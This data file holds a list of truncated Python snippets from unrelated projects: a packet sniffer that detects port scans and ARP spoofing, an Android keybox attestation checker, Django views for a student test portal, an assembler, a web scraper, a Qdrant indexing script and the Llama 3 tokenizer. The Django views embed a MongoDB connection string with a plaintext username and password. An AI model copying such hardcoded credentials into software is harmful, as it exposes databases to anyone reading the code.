    "import os\r\nimport time\r\nimport logging\r\nfrom datetime import datetime, timedelta\r\nfrom scapy.all import sniff, ARP, TCP, IP\r\n\r\n# Logging setup\r\nlogging.basicConfig(\r\n    filename=\"PacketFilterX_logs.txt\",\r\n    level=logging.INFO,\r\n    format=\"%(asctime)s - %(message)s\",\r\n    datefmt=\"%Y-%m-%d %H:%M:%S\",\r\n)\r\n\r\n# Global variables\r\nconnection_count = {}\r\narp_cache = {}\r\n\r\n# Terminal colors\r\nRESET = \"\\033[0m\"\r\nRED = \"\\033[91m\"\r\nGREEN = \"\\033[92m\"\r\nWHITE = \"\\033[97m\"\r\n\r\n# Menu display\r\ndef display_menu():\r\n    os.system(\"clear\" if os.name != \"nt\" else \"cls\")\r\n    print(f\"\"\"\r\n{GREEN}PacketFilterX: Real-Time Packet Sniffer and Analyzer{RESET}\r\n{WHITE}---------------------------------------------------\r\n1. Start Monitoring\r\n2. View Logs\r\n3. Exit\r\n{RESET}\r\n\"\"\")\r\n\r\n# Port scanning detection\r\ndef detect_port_scanning(packet):\r\n    if TCP in packet:\r\n        src_ip = packet[IP].src\r\n        dst_port = packet[TCP].dport\r\n        if src_ip not in connection_count:\r\n            connection_count[src_ip] = set()\r\n        connection_count[src_ip].add(dst_port)\r\n        if len(connection_count[src_ip]) > 100:  # Threshold for scanning\r\n            log_and_alert(f\"Port scanning detected from {src_ip}\")\r\n            return False  # Mark as bad packet\r\n    return True  # Mark as good packet\r\n\r\n# ARP spoofing detection\r\ndef detect_arp_spoofing(packet):\r\n    if ARP in packet and packet[ARP].op == 2:  # ARP reply\r\n        real_mac = arp_cache.get(packet[ARP].psrc, None)\r\n        if real_mac and real_mac != packet[ARP].hwsrc:\r\n            log_and_alert(\r\n                f\"ARP spoofing detected: {packet[ARP].psrc} has MAC conflict {real_mac} vs {packet[ARP].hwsrc}\"\r\n            )\r\n            return False  # Mark as bad packet\r\n        arp_cache[packet[ARP].psrc] = packet[ARP].hwsrc\r\n    return True  # Mark as good packet\r\n\r\n# Log and alert function\r\ndef log_and_alert(message):\r\n    print(f\"{RED}[ALERT] {message}{RESET}\")\r\n    logging.info(message)\r\n\r\n# Packet callback function\r\ndef packet_callback(packet):\r\n    try:\r\n        is_good = True\r\n        if TCP in packet or IP in packet:\r\n            is_good &= detect_port_scanning(packet)\r\n        if ARP in packet:\r\n            is_good &= detect_arp_spoofing(packet)\r\n       \r\n        # Packet details\r\n        if IP in packet:\r\n            packet_info = f\"Packet: {packet[IP].src} -> {packet[IP].dst}\"\r\n        elif ARP in packet:\r\n            packet_info = f\"ARP: {packet[ARP].hwsrc} -> {packet[ARP].psrc}\"\r\n        else:\r\n            packet_info = \"Unknown Packet\"\r\n       \r\n        # Display packet status\r\n        if is_good:\r\n            print(f\"{GREEN}[GOOD] {packet_info}{RESET}\")\r\n            logging.info(f\"Good packet: {packet_info}\")\r\n        else:\r\n            print(f\"{RED}[BAD] {packet_info}{RESET}\")\r\n            logging.info(f\"Bad packet: {packet_info}\")\r\n    except Exception as e:\r\n        logging.error(f\"Error processing packet: {e}\")\r\n\r\n# Start packet sniffing\r\ndef start_sniffer(interface, duration):\r\n    stop_time = datetime.now() + timedelta(seconds=duration)\r\n    print(f\"{GREEN}[*] Starting sniffer on interface: {interface} for {duration} seconds...{RESET}\")\r\n    try:\r\n        sniff(\r\n            iface=interface,\r\n            prn=packet_callback,\r\n            store=False,\r\n            stop_filter=lambda p: datetime.now() >= stop_time\r\n        )\r\n        print(f\"{GREEN}[*] Scanning completed successfully.{RESET}\")\r\n    except KeyboardInterrupt:\r\n        print(f\"\\n{RED}[!] Stopping sniffer...{RESET}\")\r\n    except Exception as e:\r\n        print(f\"{RED}[!] Error: {e}{RESET}\")\r\n\r\n# View logs\r\ndef view_logs():\r\n    if os.path.exists(\"PacketFilterX_logs.txt\"):\r\n        print(f\"\\n{WHITE}[Logs from PacketFilterX]{RESET}\")\r\n        with open(\"PacketFilterX_logs.txt\", \"r\") as log_file:\r\n            print(log_file.read())\r\n    else:\r\n        print(f\"{RED}[!] No logs found.{RESET}\")\r\n    input(f\"{WHITE}[Press Enter to continue...]{RESET}\")\r\n\r\n# Main program\r\ndef main():\r\n    while True:\r\n        display_menu()\r\n        choice = input(f\"{WHITE}[?] Select an option: {RESET}\")\r\n        if choice == \"1\":\r\n            interface = input(f\"{WHITE}[?] Enter network interface (e.g., eth0): {RESET}\")\r\n            try:\r\n                duration = int(input(f\"{WHITE}[?] Enter duration for scanning (in seconds): {RESET}\"))\r\n                start_sniffer(interface, duration)\r\n                print(f\"{GREEN}[*] Scanning complete. Check logs for details.{RESET}\")\r\n            except ValueError:\r\n                print(f\"{RED}[!] Invalid duration. Please enter a number.{RESET}\")\r\n        elif choice == \"2\":\r\n            view_logs()\r\n        elif choice == \"3\":\r\n            print(f\"{GREEN}[*] Exiting PacketFilterX. Goodbye!{RESET}\")\r\n            break\r\n        else:\r\n            print(f\"{RED}[!] Invalid option. Please try again.{RESET}\")\r\n            time.sleep(1)\r\n\r\nif __name__ == \"__main__\":\r\n    main()",
    "# -*- coding: utf-8 -*-\n# @Time: 2024/7/28 19:55\n# @FileName: event.py\n# @Software: PyCharm\n# @GitHub: KimmyXYC\n\n# Yep, completely stolen from @KimmyXYC. give them some love !\n\nimport requests\nimport xml.etree.ElementTree as ET\nfrom datetime import datetime\nfrom cryptography import x509\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives import hashes, serialization\nfrom cryptography.hazmat.primitives.asymmetric import padding, ec\nfrom datetime import datetime, timezone\n\nurl = \"https://android.googleapis.com/attestation/status\"\nheaders = {\n    \"Cache-Control\": \"max-age=0, no-cache, no-store, must-revalidate\",\n    \"Pragma\": \"no-cache\",\n    \"Expires\": \"0\",\n}\nresponse = requests.get(url, headers=headers)\nif response.status_code != 200:\n    raise Exception(f\"Error fetching data: {response.reason}\")\nstatus_json = response.json()\n\n\ndef parse_number_of_certificates(xml_file):\n    root = ET.fromstring(xml_file)\n    number_of_certificates = root.find(\".//NumberOfCertificates\")\n\n    if number_of_certificates is not None:\n        count = int(number_of_certificates.text.strip())\n        return count\n    else:\n        raise Exception(\"No NumberOfCertificates found.\")\n\n\ndef parse_certificates(xml_file, pem_number):\n    root = ET.fromstring(xml_file)\n\n    pem_certificates = root.findall('.//Certificate[@format=\"pem\"]')\n\n    if pem_certificates is not None:\n        pem_contents = [cert.text.strip() for cert in pem_certificates[:pem_number]]\n        return pem_contents\n    else:\n        raise Exception(\"No Certificate found.\")\n\n\ndef load_public_key_from_file(file_path):\n    with open(file_path, \"rb\") as key_file:\n        public_key = serialization.load_pem_public_key(key_file.read(), backend=default_backend())\n    return public_key\n\n\ndef compare_keys(public_key1, public_key2):\n    return public_key1.public_bytes(\n        encoding=serialization.Encoding.PEM,\n        format=serialization.PublicFormat.SubjectPublicKeyInfo,\n    ) == public_key2.public_bytes(\n        encoding=serialization.Encoding.PEM,\n        format=serialization.PublicFormat.SubjectPublicKeyInfo,\n    )\n\n\ndef keybox_check(certificate_text):\n    try:\n        # Assuming the certificate text contains PEM certificates\n        pem_number = parse_number_of_certificates(certificate_text)\n        pem_certificates = parse_certificates(certificate_text, pem_number)\n    except Exception as e:\n        print(f\"[Keybox Check Error]: {e}\")\n        return False\n\n    try:\n        certificate = x509.load_pem_x509_certificate(pem_certificates[0].encode(), default_backend())\n    except Exception as e:\n        print(f\"[Keybox Check Error]: {e}\")\n        return False\n\n    # Certificate Validity Verification\n    not_valid_before = certificate.not_valid_before_utc\n    not_valid_after = certificate.not_valid_after_utc\n    current_time = datetime.now(timezone.utc)\n    is_valid = not_valid_before <= current_time <= not_valid_after\n    if not is_valid:\n        return False\n\n    # Keychain Authentication\n    for i in range(pem_number - 1):\n        son_certificate = x509.load_pem_x509_certificate(pem_certificates[i].encode(), default_backend())\n        father_certificate = x509.load_pem_x509_certificate(pem_certificates[i + 1].encode(), default_backend())\n\n        if son_certificate.issuer != father_certificate.subject:\n            return False\n        signature = son_certificate.signature\n        signature_algorithm = son_certificate.signature_algorithm_oid._name\n        tbs_certificate = son_certificate.tbs_certificate_bytes\n        public_key = father_certificate.public_key()\n        try:\n            if signature_algorithm in [\n                \"sha256WithRSAEncryption\",\n                \"sha1WithRSAEncryption\",\n                \"sha384WithRSAEncryption\",\n                \"sha512WithRSAEncryption\",\n            ]:\n                hash_algorithm = {\n                    \"sha256WithRSAEncryption\": hashes.SHA256(),\n                    \"sha1WithRSAEncryption\": hashes.SHA1(),\n                    \"sha384WithRSAEncryption\": hashes.SHA384(),\n                    \"sha512WithRSAEncryption\": hashes.SHA512(),\n                }[signature_algorithm]\n                padding_algorithm = padding.PKCS1v15()\n                public_key.verify(signature, tbs_certificate, padding_algorithm, hash_algorithm)\n            elif signature_algorithm in [\n                \"ecdsa-with-SHA256\",\n                \"ecdsa-with-SHA1\",\n                \"ecdsa-with-SHA384\",\n                \"ecdsa-with-SHA512\",\n            ]:\n                hash_algorithm = {\n                    \"ecdsa-with-SHA256\": hashes.SHA256(),\n                    \"ecdsa-with-SHA1\": hashes.SHA1(),\n                    \"ecdsa-with-SHA384\": hashes.SHA384(),\n                    \"ecdsa-with-SHA512\": hashes.SHA512(),\n                }[signature_algorithm]\n                padding_algorithm = ec.ECDSA(hash_algorithm)\n                public_key.verify(signature, tbs_certificate, padding_algorithm)\n            else:\n                ",
    "from django.http import JsonResponse\nfrom pymongo import MongoClient\n\ndef studentstats(request, regno):\n    client = MongoClient('mongodb+srv://ihub:ihub@test-portal.lcgyx.mongodb.net/test_portal_db?retryWrites=true&w=majority')\n    db = client['test_portal_db']\n\n    # Fetch student data\n    student_data = db.students.find_one({\"regno\": regno})\n    if not student_data:\n        return JsonResponse({\"error\": \"Student not found\"}, status=404)\n\n    # Fetch contest data visible to the student\n    contest_data = db.coding_assessments.find({\"visible_to\": regno}, {\"_id\": 0})\n    contest_list = list(contest_data)\n\n    # Fetch all contest IDs visible to the student\n    contest_ids = [contest.get(\"contestId\") for contest in contest_list if contest.get(\"contestId\")]\n\n    # Fetch coding report for contests relevant to the student\n    coding_reports = db.coding_report.find({\"contest_id\": {\"$in\": contest_ids}})\n    coding_report_map = {report[\"contest_id\"]: report for report in coding_reports}\n\n    # Determine test statuses\n    completed_tests = 0\n    in_progress_tests = 0\n\n    for contest_id in contest_ids:\n        report = coding_report_map.get(contest_id)\n\n        if not report:\n            # No report means the test is in progress\n            in_progress_tests += 1\n        else:\n            # Find the status for the current student\n            student_status = None\n            for student in report[\"students\"]:\n                if str(student[\"student_id\"]) == str(student_data[\"_id\"]):\n                    student_status = student.get(\"status\")\n                    break\n\n            if student_status == \"Completed\":\n                completed_tests += 1\n            else:\n                in_progress_tests += 1\n\n    # Response with all assessment details\n    assessments = []\n    for contest in contest_list:\n        assessment_overview = contest.get(\"assessmentOverview\", {})\n        problems = []\n        contest_status = \"Yet to Start\"  # Default status for contest\n\n        # Check the contest status based on the coding report\n        report = coding_report_map.get(contest.get(\"contestId\"))\n        if report:\n            for student in report[\"students\"]:\n                if str(student[\"student_id\"]) == str(student_data[\"_id\"]):\n                    contest_status = student.get(\"status\", \"Pending\")  # Get the contest status\n                    break\n\n        # Handle problems based on contest status\n        if contest_status == \"Completed\":\n            for student in report[\"students\"]:\n                if str(student[\"student_id\"]) == str(student_data[\"_id\"]):\n                    attended_questions = student.get(\"attended_question\", [])\n                    for attended_problem in attended_questions:\n                        problems.append({\n                            \"title\": attended_problem.get(\"title\", \"\"),\n                            \"result\": attended_problem.get(\"result\", \"\"),\n                            \"level\": attended_problem.get(\"level\", \"\"),\n                            \"problem_statement\": attended_problem.get(\"problem_statement\", \"\")\n                        })\n                    break\n        elif contest_status == \"Pending\":\n            problems = \"Pending\"\n        else:  # Yet to Start\n            problems = \"No problems yet\"\n\n        # Add assessment details for this contest\n        assessments.append({\n            \"contestId\": contest.get(\"contestId\", \"\"),\n            \"name\": assessment_overview.get(\"name\", \"\"),\n            \"description\": assessment_overview.get(\"description\", \"\"),\n            \"registrationStart\": assessment_overview.get(\"registrationStart\", \"\"),\n            \"registrationEnd\": assessment_overview.get(\"registrationEnd\", \"\"),\n            \"guidelines\": assessment_overview.get(\"guidelines\", \"\"),\n            \"questions\": contest.get(\"testConfiguration\", {}).get(\"questions\", \"\"),\n            \"duration\": contest.get(\"testConfiguration\", {}).get(\"duration\", \"\"),\n            \"passPercentage\": contest.get(\"testConfiguration\", {}).get(\"passPercentage\", \"\"),\n            \"problems\": problems,\n            \"contestStatus\": contest_status  # Added contest status\n        })\n\n    response_data = {\n        \"student\": {\n            \"name\": student_data.get(\"name\", \"\"),\n            \"email\": student_data.get(\"email\", \"\"),\n            \"collegename\": student_data.get(\"collegename\", \"\"),\n            \"dept\": student_data.get(\"dept\", \"\"),\n            \"regno\": regno,\n            \"year\": student_data.get(\"year\",\"\"),\n        },\n        \"performance\": {\n            \"total_tests\": len(contest_ids),\n            \"completed_tests\": completed_tests,\n            \"in_progress_tests\": in_progress_tests,\n            \"average_score\": 0,  # Placeholder for average score logic\n        },\n        \"assessments\": assessments\n    }\n\n    return JsonResponse(response_data)\n\ndef mcq_student_results(request, regno):\n    client = MongoClient('mongodb+srv://ihub:ihub@test-portal.lcgyx.mongodb.net/test_portal_db?retryWrites=true&w=majority')\n",
    "import sys\nimport os\nfrom prettytable import PrettyTable\nfrom helpers import *\n\n\ndef main(args: list[str], current_file: str) -> None:\n    output_name = \"\"\n    usage_msg = f\"\"\"Usage: 'python .\\\\{current_file} asm.txt output.txt [flags]\n    Flags:\n    -b: Outputs Machine code in binary\n    -h: Outputs Machine code in hex\n    -d: Outputs Machine code in decimal\n    -st: Prints the symbolic table in the terminal\"\"\"\n    if not 2 <= len(args) <= 5:\n        Exit(f\"Invalid number of arguments. {usage_msg}\", 2)\n\n    flag = \"-b\"\n    show_sym_table = False\n    output_name = \"output.txt\"\n\n    if len(args) >= 3 and not args[2].startswith(\"-\"):\n        output_name = args[2]\n        args = [args[0], args[1]] + args[3:]\n\n    for arg in args[2:]:\n        if arg in {\"-b\", \"-d\", \"-h\"}:\n            flag = arg\n        elif arg == \"-st\":\n            show_sym_table = True\n        else:\n            Exit(f\"Invalid flag. {usage_msg}\", 1)\n\n    try:\n        sym_table = first_pass(args[1])\n        print_sym_table(sym_table) if show_sym_table else None\n\n    except FileNotFoundError:\n        Exit(f\"ERROR: File '{args[1]}' Not Found!\", 7)\n\n    out_lines = process_file(args[1], flag, sym_table)\n    with open(output_name, \"w\") as output:\n        out_lines = convert(out_lines, flag)\n        output.writelines(out_lines[:-1])\n        print(f\"Output saved to '{os.path.abspath(output_name)}'\")\n\n\ndef process_file(file_path: str, flag: str, sym_table: dict[str, int]) -> None:\n    \"\"\"\n    Performs the second pass, processes the input file, outputs the result in output.txt in the same directory\n    \"\"\"\n    LC = 0x0\n    out_lines = []\n    with open(file_path) as file:\n        ln = 0\n        for line in file:  # reads a line\n            ln += 1\n            words = line.upper().split()\n            for i, word in enumerate(words):\n                if word.startswith(\"/\"):\n                    words = words[:i]\n                    break\n\n            if not words:\n                continue\n\n            if words[0].startswith(\"/\"):\n                print(line)\n                print(words)\n\n            if words[0] == \"END\":\n                break\n\n            elif words[0] == \"ORG\":\n                LC = int(words[1], base=16)\n\n                out_lines = out_lines[:-1]\n                out_lines.append(f\"{bin(LC)[2:]:>012}\" + \"\\t\")\n                continue\n\n            elif words[0].endswith(\",\"):  # if label\n                inst = read_inst(words[1:], sym_table, ln)\n\n            else:  # if normal instruction\n                inst = read_inst(words, sym_table, ln)\n\n            LC += 1\n            out_lines.append(inst + \"\\n\")\n            out_lines.append(f\"{bin(LC)[2:]:>012}\" + \"\\t\")\n\n    return out_lines\n\n\ndef read_inst(words: list, table: dict, line_number) -> str:\n    \"\"\"\n    Reads and parses an instruction line, returning its binary representation\n    \"\"\"\n    try:\n        if words[0] in mri:\n            suffix = 8 if len(words) > 2 and words[2] == \"I\" else 0\n            return f\"{bin(int(mri[words[0]], base=2) + suffix)[2:]:>04}\" + str_to_bin(\n                table[words[1]], 16, 12\n            )  #\n\n        if words[0] in non_mri:\n            return str_to_bin(non_mri[words[0]], 16)\n\n        if words[0] == \"DEC\":\n            return str_to_bin(words[1])\n\n        if words[0] == \"HEX\":\n            return str_to_bin(words[1], 16)\n\n    except Exception as e:\n        Exit(f\"Invalid Syntax on line {line_number}.\\nError: {e}\", 4)\n\n    else:\n        Exit(\n            f\"Invalid Syntax on line {line_number}.\\nInvalid Instruction '{words[0]}'\",\n            5,\n        )\n\n\ndef convert(lst: list[str], flag: str, size: int = 4) -> list:\n    \"\"\"\n    Converts the machine code to specific format (binary, decimal, hexdecimal). Controlled by the flag.\n    \"\"\"\n    if flag == \"-b\":\n        return lst\n    out = []\n    for i in lst:\n        suffix = i[-1:]\n        if flag == \"-d\":\n            res = str(int(i[:-1], base=2))\n        elif flag == \"-h\":\n            if suffix == \"\\t\":\n                size = 3\n            elif suffix == \"\\n\":\n                size = 4\n            res = hex(int(i[:-1], base=2))[2:].zfill(size).upper()\n        out.append(res + suffix)\n    return out\n\n\ndef str_to_bin(txt: str, base=10, size: int = 16) -> str:\n    \"\"\"\n    Converts numbers to binary\n    \"\"\"\n    return bin(0xFFFF & int(str(txt), base=base))[2:].zfill(size)\n\n\ndef first_pass(file: str) -> dict[int, str]:\n    \"\"\"\n    Performs the first pass.\n    Returns the symbol address table for the labels\n    \"\"\"\n    table = {}\n    LC = 0x0\n    with open(file, \"r\") as f:\n        lc = 0\n        for line in f:  # reads a line\n            lc += 1\n            words = line.upper().split()\n\n            if not words or words[0].startswith(\"/\"):\n                continue\n\n            if words[0] == \"ORG\":\n                try:\n                    LC = int(words[1], 16)\n                except ValueError:\n                    Exit(f\"Invalid Syntax on line {lc}. => '{words[1]}'\", 3)\n                continue\n\n            eli",
    "import requests\nfrom bs4 import BeautifulSoup\nimport os\nfrom urllib.parse import urlparse\nimport time\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\n\nclass SitemapScraper:\n    def __init__(self, output_folder='output'):\n        self.output_folder = output_folder\n        self.scraped_content = {}  # Add this to store content\n        if not os.path.exists(output_folder):\n            os.makedirs(output_folder)\n        \n        # Setup Chrome options\n        chrome_options = Options()\n        chrome_options.add_argument('--headless')  # Run in headless mode\n        chrome_options.add_argument('--disable-gpu')\n        chrome_options.add_argument('--no-sandbox')\n        chrome_options.add_argument('--disable-images')  # Disable images\n        self.driver = webdriver.Chrome(options=chrome_options)\n\n    def fetch_sitemap(self, sitemap_url):\n        \"\"\"Fetch and parse sitemap XML.\"\"\"\n        try:\n            response = requests.get(sitemap_url)\n            response.raise_for_status()\n            soup = BeautifulSoup(response.content, 'xml')\n            urls = [loc.text for loc in soup.find_all('loc')]\n            return urls\n        except requests.RequestException as e:\n            print(f\"Error fetching sitemap: {e}\")\n            return []\n\n    def sanitize_filename(self, url):\n        \"\"\"Convert URL to a valid filename.\"\"\"\n        parsed = urlparse(url)\n        path = parsed.path.strip('/')\n        if not path:\n            path = 'index'\n        return f\"{path.replace('/', '_')}.pdf\"\n\n    def save_as_text(self, url):\n        \"\"\"Save webpage content as text after rendering JavaScript.\"\"\"\n        try:\n            filename = self.sanitize_filename(url).replace('.pdf', '.txt')\n            \n            print(f\"Fetching {url}...\")\n            self.driver.get(url)\n            \n            # Wait for the page to load (adjust timeout as needed)\n            WebDriverWait(self.driver, 10).until(\n                EC.presence_of_element_located((By.TAG_NAME, \"body\"))\n            )\n            \n            # Get the rendered text\n            text_content = self.driver.find_element(By.TAG_NAME, \"body\").text\n            \n            # Store content in dictionary instead of saving directly\n            self.scraped_content[filename] = text_content\n            \n            print(f\"Processed {filename}\")\n            return True\n        except Exception as e:\n            print(f\"Error saving text for {url}: {e}\")\n            return False\n\n    def process_sitemap(self, sitemap_url):\n        \"\"\"Process entire sitemap and save all pages as text.\"\"\"\n        urls = self.fetch_sitemap(sitemap_url)\n        if not urls:\n            print(\"No URLs found in sitemap.\")\n            return {}\n\n        print(f\"Found {len(urls)} URLs in sitemap.\")\n        try:\n            for url in urls:\n                self.save_as_text(url)\n                time.sleep(1)\n        finally:\n            self.driver.quit()  # Ensure browser is closed\n        \n        return self.scraped_content  # Return the collected content\n\ndef get_user_preference():\n    while True:\n        choice = input(\"\"\"\nChoose output format:\n1. Individual files (one file per page)\n2. Single merged file (all pages in one file with headers)\n\nEnter 1 or 2: \"\"\").strip()\n        \n        if choice in ['1', '2']:\n            return choice == '2'  # Returns True for merged, False for individual\n        print(\"Invalid choice. Please enter 1 or 2.\")\n\ndef main():\n    # Get user preference at start\n    merge_files = get_user_preference()\n    \n    sitemap_url = input(\"Enter sitemap URL (e.g., https://example.com/sitemap.xml): \")\n    scraper = SitemapScraper()\n    scraped_content = scraper.process_sitemap(sitemap_url)  # Get the content\n\n    # Handle output based on user preference\n    if merge_files:\n        # Merged file output\n        with open('merged_output.txt', 'w', encoding='utf-8') as f:\n            for filename, content in scraped_content.items():\n                f.write(f\"\\n{'='*50}\\n\")\n                f.write(f\"{filename}\\n\")\n                f.write(f\"{'='*50}\\n\\n\")\n                f.write(content)\n                f.write('\\n\\n')\n    else:\n        # Individual files output\n        for filename, content in scraped_content.items():\n            with open(f\"output/{filename}\", 'w', encoding='utf-8') as f:\n                f.write(content)\n\nif __name__ == \"__main__\":\n    main()\n",
    "import argparse\nfrom ast import literal_eval\n\nfrom dataloaders.haystack import ARCDataloader,EdgarDataloader, FactScoreDataloader, PopQADataloader, TriviaQADataloader\nfrom dataloaders.haystack.llms import ChatGroqGenerator \nfrom haystack.components.embedders import SentenceTransformersDocumentEmbedder\nfrom qdrant_client import QdrantClient\nfrom qdrant_client.models import Filter\n\nfrom vectordb import QdrantDocumentConverter, QdrantVectorDB\n\n\ndef main():\n    \"\"\"Main function to handle Qdrant indexing and querying.\"\"\"\n    # Argument parser for user inputs\n    parser = argparse.ArgumentParser(description=\"Script for processing and indexing data with Qdrant.\")\n    \n    # Dataloader parameters\n    parser.add_argument(\n        \"--dataloader\",\n        required=True,\n        choices=[\"triviaqa\", \"arc\", \"popqa\", \"factscore\", \"edgar\"],\n        help=\"Dataloader to use for loading datasets.\",\n    )\n    parser.add_argument(\"--dataset_name\", required=True, help=\"Name of the dataset to be used by the dataloader.\")\n    parser.add_argument(\"--split\", default=\"test\", help=\"Dataset split to process (e.g., 'test', 'train').\")\n    parser.add_argument(\n        \"--text_splitter\",\n        default=\"RecursiveCharacterTextSplitter\",\n        help=\"Text splitter method to preprocess documents.\",\n    )\n    parser.add_argument(\n        \"--text_splitter_params\", type=str, help=\"JSON string of parameters for configuring the text splitter.\"\n    )\n\n    # Generator parameters\n    parser.add_argument(\"--generator_model\", type=str, help=\"Model name for the dataloader's generator.\")\n    parser.add_argument(\"--generator_api_key\", help=\"API key for the dataloader generator.\")\n    parser.add_argument(\"--generator_llm_params\", type=str, help=\"JSON string of parameters for the generator LLM.\")\n\n    # Embedder parameters\n    parser.add_argument(\n        \"--embedding_model\",\n        default=\"sentence-transformers/all-MiniLM-L6-v2\",\n        help=\"Model to use for generating document embeddings.\",\n    )\n    parser.add_argument(\"--embedding_model_params\", type=str, help=\"JSON string of parameters for the embedding model.\")\n\n    # Qdrant parameters\n    parser.add_argument(\"--qdrant_host\", required=True, help=\"Qdrant host URL.\")\n    parser.add_argument(\"--qdrant_api_key\", required=True, help=\"API key for accessing Qdrant.\")\n    parser.add_argument(\"--collection_name1\", type=str, required=True, help=\"First collection name.\")\n    parser.add_argument(\"--collection_name2\", type=str, required=True, help=\"Second collection name.\")\n    parser.add_argument(\"--query\", type=str, required=True, help=\"Query string for Qdrant search.\")\n\n    # Parse arguments\n    args = parser.parse_args()\n\n    # Parse JSON strings\n    text_splitter_params = literal_eval(args.text_splitter_params) if args.text_splitter_params else {}\n    generator_params = literal_eval(args.generator_llm_params) if args.generator_llm_params else {}\n    embedding_model_params = literal_eval(args.embedding_model_params) if args.embedding_model_params else {}\n\n    # Initialize generator if model and API key are provided\n    generator = None\n    if args.generator_model and args.generator_api_key:\n        generator = ChatGroqGenerator(\n            model=args.generator_model,\n            api_key=args.generator_api_key,\n            llm_params=generator_params,\n        )\n\n    # Initialize dataloader\n    dataloader = TriviaQADataloader(\n        answer_summary_generator=generator,\n        dataset_name=args.dataset_name,\n        split=args.split,\n        text_splitter=args.text_splitter,\n        text_splitter_params=text_splitter_params,\n    )\n\n    # Load data and preprocess\n    dataloader.load_data()\n    haystack_documents = dataloader.get_haystack_documents()\n\n    # Initialize the embedding model\n    embedder = SentenceTransformersDocumentEmbedder(model=args.embedding_model, **embedding_model_params)\n    embedder.warm_up()\n\n    # Create embeddings for documents\n    docs_with_embeddings = embedder.run(documents=haystack_documents)[\"documents\"]\n\n    # Initialize Qdrant VectorDB\n    qdrant_client = QdrantClient(url=args.qdrant_host, api_key=args.qdrant_api_key)\n\n    # Create collections in Qdrant (if they do not already exist)\n    qdrant_client.create_collection(\n        collection_name=args.collection_name1,\n        vector_size=docs_with_embeddings[0]['embedding'].shape[0],  # Assuming all embeddings are of the same size\n        distance=\"Cosine\"\n    )\n    qdrant_client.create_collection(\n        collection_name=args.collection_name2,\n        vector_size=docs_with_embeddings[0]['embedding'].shape[0],\n        distance=\"Cosine\"\n    )\n\n    # Prepare documents for Qdrant upsert\n    docs_for_qdrant = QdrantDocumentConverter.prepare_haystack_documents_for_upsert(docs_with_embeddings)\n\n    # Upsert data into Qdrant collections\n    qdrant_client.upsert(\n        collection_name=args.collection_name1,\n        points=docs_for_qdrant\n    )\n    qdrant_client.upsert(\n        collection_name=args.collection_name2,\n        points=",
    "# Copyright (c) Meta Platforms, Inc. and affiliates.\n# This software may be used and distributed in accordance with the terms of the Llama 3 Community License Agreement.\n\nimport os\nfrom logging import getLogger\nfrom pathlib import Path\nfrom typing import (\n    AbstractSet,\n    cast,\n    Collection,\n    Dict,\n    Iterator,\n    List,\n    Literal,\n    Sequence,\n    TypedDict,\n    Union,\n)\n\nimport tiktoken\nfrom tiktoken.load import load_tiktoken_bpe\n\n\nlogger = getLogger(__name__)\n\n\nRole = Literal[\"system\", \"user\", \"assistant\"]\n\n\nclass Message(TypedDict):\n    role: Role\n    content: str\n\n\nDialog = Sequence[Message]\n\n\nclass Tokenizer:\n    \"\"\"\n    Tokenizing and encoding/decoding text using the Tiktoken tokenizer.\n    \"\"\"\n\n    special_tokens: Dict[str, int]\n\n    num_reserved_special_tokens = 256\n\n    pat_str = r\"(?i:'s|'t|'re|'ve|'m|'ll|'d)|[^\\r\\n\\p{L}\\p{N}]?\\p{L}+|\\p{N}{1,3}| ?[^\\s\\p{L}\\p{N}]+[\\r\\n]*|\\s*[\\r\\n]+|\\s+(?!\\S)|\\s+\"  # noqa: E501\n\n    def __init__(self, model_path: str):\n        \"\"\"\n        Initializes the Tokenizer with a Tiktoken model.\n\n        Args:\n            model_path (str): The path to the Tiktoken model file.\n        \"\"\"\n        assert os.path.isfile(model_path), model_path\n\n        mergeable_ranks = load_tiktoken_bpe(model_path)\n        num_base_tokens = len(mergeable_ranks)\n        special_tokens = [\n            \"<|begin_of_text|>\",\n            \"<|end_of_text|>\",\n            \"<|reserved_special_token_0|>\",\n            \"<|reserved_special_token_1|>\",\n            \"<|reserved_special_token_2|>\",\n            \"<|reserved_special_token_3|>\",\n            \"<|start_header_id|>\",\n            \"<|end_header_id|>\",\n            \"<|reserved_special_token_4|>\",\n            \"<|eot_id|>\",  # end of turn\n        ] + [\n            f\"<|reserved_special_token_{i}|>\"\n            for i in range(5, self.num_reserved_special_tokens - 5)\n        ]\n        self.special_tokens = {\n            token: num_base_tokens + i for i, token in enumerate(special_tokens)\n        }\n        self.model = tiktoken.Encoding(\n            name=Path(model_path).name,\n            pat_str=self.pat_str,\n            mergeable_ranks=mergeable_ranks,\n            special_tokens=self.special_tokens,\n        )\n        logger.info(f\"Reloaded tiktoken model from {model_path}\")\n\n        self.n_words: int = self.model.n_vocab\n        # BOS / EOS token IDs\n        self.bos_id: int = self.special_tokens[\"<|begin_of_text|>\"]\n        self.eos_id: int = self.special_tokens[\"<|end_of_text|>\"]\n        self.pad_id: int = -1\n        self.stop_tokens = {\n            self.special_tokens[\"<|end_of_text|>\"],\n            self.special_tokens[\"<|eot_id|>\"],\n        }\n        logger.info(\n            f\"#words: {self.n_words} - BOS ID: {self.bos_id} - EOS ID: {self.eos_id}\"\n        )\n\n    def encode(\n        self,\n        s: str,\n        *,\n        bos: bool,\n        eos: bool,\n        allowed_special: Union[Literal[\"all\"], AbstractSet[str]] = set(),\n        disallowed_special: Union[Literal[\"all\"], Collection[str]] = (),\n    ) -> List[int]:\n        \"\"\"\n        Encodes a string into a list of token IDs.\n\n        Args:\n            s (str): The input string to be encoded.\n            bos (bool): Whether to prepend the beginning-of-sequence token.\n            eos (bool): Whether to append the end-of-sequence token.\n            allowed_tokens (\"all\"|set[str]): allowed special tokens in string\n            disallowed_tokens (\"all\"|set[str]): special tokens that raise an error when in string\n\n        Returns:\n            list[int]: A list of token IDs.\n\n        By default, setting disallowed_special=() encodes a string by ignoring\n        special tokens. Specifically:\n        - Setting `disallowed_special` to () will cause all text corresponding\n          to special tokens to be encoded as natural text (insteading of raising\n          an error).\n        - Setting `allowed_special` to \"all\" will treat all text corresponding\n          to special tokens to be encoded as special tokens.\n        \"\"\"\n        assert type(s) is str\n\n        # The tiktoken tokenizer can handle <=400k chars without\n        # pyo3_runtime.PanicException.\n        TIKTOKEN_MAX_ENCODE_CHARS = 400_000\n\n        # https://github.com/openai/tiktoken/issues/195\n        # Here we iterate 